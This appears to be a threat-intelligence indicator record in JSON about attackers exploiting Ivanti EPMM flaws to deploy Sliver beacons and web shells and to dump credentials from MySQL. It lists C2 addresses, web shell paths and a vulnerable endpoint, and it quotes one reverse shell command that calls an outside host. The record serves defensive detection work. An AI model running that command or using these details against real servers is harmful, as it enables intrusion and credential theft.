@@ -1,0 +1,255 @@
+{
+  "malware_family": "Sliver",
+  "threat_actor": "Unknown",
+  "platforms": [
+    "linux"
+  ],
+  "summary": "Threat actors are exploiting a vulnerability chain (CVE-2025-4427, CVE-2025-4428) in Ivanti Endpoint Manager Mobile (EPMM) to achieve remote code execution. Post-exploitation activities include deploying Sliver beacons, JSP web shells like Behinder, and establishing reverse shells. Attackers have also been observed dumping credentials from the underlying MySQL database.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "sh -i >& /dev/tcp/47.120.74.19/8080 0>&1",
+      "context": "Reverse shell executed via Java Runtime.exec() from exploited EPMM process.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/mi/tomcat/webapps/mifs/401.jsp",
+      "context": "Webshell path masquerading as HTTP error page.",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/mi/tomcat/webapps/mifs/css/css.css",
+      "context": "Webshell path masquerading as CSS file.",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/mi/tomcat/webapps/mifs/session.jsp",
+      "context": "Webshell path observed in the wild.",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/mi/tomcat/webapps/mifs/baseURL.jsp",
+      "context": "Webshell path observed in the wild.",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "certificate_subject",
+      "value": "C=PL, O=home.pl S.A., CN=Certyfikat SSL",
+      "context": "Certificate for Sliver C2 77.221.158.154.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "mifs",
+      "context": "Name of MySQL database targeted by attackers.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "mifs_ldap_server_config",
+      "context": "Name of MySQL table dumped by attackers.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "mifs_ldap_users",
+      "context": "Name of MySQL table dumped by attackers.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "mi_user",
+      "context": "Name of MySQL table dumped by attackers.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "DeviceFeatureUsageReportQueryRequestValidator",
+      "context": "Vulnerable Java class in Ivanti EPMM leading to RCE.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "uri_path",
+      "value": "/mifs/rs/api/v2/featureusage",
+      "context": "Full exploit path for reverse shell example.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/api/v2/featureusage",
+      "context": "Vulnerable endpoint path in Ivanti EPMM.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "77.221.158.154",
+      "context": "Sliver C2 IP Address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "Sliver"
+    },
+    {
+      "kind": "ip",
+      "value": "150.241.97.83",
+      "context": "Sliver C2 IP Address.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "Sliver"
+    },
+    {
+      "kind": "ip",
+      "value": "185.193.125.65",
+      "context": "IP Address Hosting Sliver payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "Sliver"
+    },
+    {
+      "kind": "domain",
+      "value": "censysinspect.com",
+      "context": "Domain previously resolved to Sliver C2 77.221.158.154.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "Sliver"
+    },
+    {
+      "kind": "domain",
+      "value": "elektrobohater.pl",
+      "context": "Domain serving certificate used by Sliver C2.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "wagodirect.pl",
+      "context": "Domain serving certificate used by Sliver C2.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "e-wago.pl",
+      "context": "Domain serving certificate used by Sliver C2.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "82.132.235.212",
+      "context": "IP used for MySQL Dumping Activity.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "37.219.84.22",
+      "context": "IP used for MySQL Dumping Activity.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "47.120.74.19",
+      "context": "Reverse shell C2 destination IP.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "75.170.92.132",
+      "context": "IP used for Behinder WS deployment.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "Behinder WS"
+    },
+    {
+      "kind": "ip",
+      "value": "5.181.159.149",
+      "context": "IP used for Behinder WS deployment (VPN).",
+      "specificity": "medium",
+      "evidence": "ioc_list",
+      "origin_tool": "Behinder WS"
+    },
+    {
+      "kind": "url",
+      "value": "https://dpaste.com/9MQEJ6VYR.txt",
+      "context": "Hosted commands for MySQL dumping.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "craft-dev.greenenaftaligallery.com/a.txt",
+      "context": "Compromised site hosting a web shell.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "script"
+  ]
+}
